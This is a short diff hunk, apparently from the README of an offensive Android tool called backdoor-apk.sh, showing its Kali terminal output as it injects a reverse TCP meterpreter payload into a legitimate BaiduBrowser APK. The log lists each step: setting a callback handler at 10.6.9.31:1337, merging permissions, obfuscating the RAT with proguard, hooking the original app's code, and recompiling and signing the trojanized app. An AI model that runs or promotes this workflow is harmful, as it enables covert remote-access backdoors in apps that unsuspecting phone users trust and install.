@@ -7,14 +7,16 @@ Usage:
 root@kali:~/Android/evol-lab/BaiduBrowserRat# ./backdoor-apk.sh BaiduBrowser.apk 
 [*] Generating reverse tcp meterpreter payload...done.
 [+] Handle the meterpreter connection at: 10.6.9.31:1337
-[*] Decompiling original APK file...done.
 [*] Decompiling RAT APK file...done.
+[*] Decompiling original APK file...done.
+[*] Merging permissions of original and payload projects...done.
+[*] Running proguard on RAT APK file...done.
+[*] Decompiling obfuscated RAT APK file...done.
 [*] Creating new directories in original project for RAT smali files...done.
 [*] Copying RAT smali files to new directories in original project...done.
 [*] Fixing RAT smali files...done.
 [*] Locating smali file to hook in original project...done.
 [*] Adding hook in original smali file...done.
-[*] Merging permissions of original and payload projects...done.
 [*] Recompiling original project with backdoor...done.
 [*] Signing recompiled APK...done.
 root@kali:~/Android/evol-lab/BaiduBrowserRat#
